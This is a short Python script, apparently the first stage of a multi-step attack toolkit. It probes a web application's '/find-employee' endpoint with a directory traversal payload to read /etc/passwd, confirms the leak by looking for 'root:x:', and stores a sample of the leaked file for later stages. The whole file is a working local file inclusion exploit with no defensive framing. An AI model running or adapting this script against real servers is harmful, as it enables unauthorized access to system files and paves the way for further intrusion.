# file: 01_lfi_check.py
import requests
from pathlib import Path
from shared.helpers import State

TRAVERSAL = "../" * 10  # generous depth
TARGET = "/etc/passwd"

def main():
    cfg = State.load_cfg()
    mem = State.load_mem()

    base = cfg['base_url'].rstrip('/')
    url = f"{base}/find-employee?employee_code={TRAVERSAL}{TARGET}"
    print(f"[+] Testing LFI at: {url}")

    r = requests.get(url, timeout=15)
    ok = (r.status_code == 200) and ("root:x:" in r.text)

    mem.update({
        'lfi_checked_url': url,
        'lfi_status_code': r.status_code,
        'lfi_confirmed': bool(ok),
        'etc_passwd_sample': r.text[:400]
    })
    State.save_mem(mem)

    if ok:
        print("[+] LFI CONFIRMED: /etc/passwd leaked")
    else:
        print(f"[!] LFI not confirmed (status={r.status_code}). Check base_url or traversal depth.")

if __name__ == '__main__':
    main()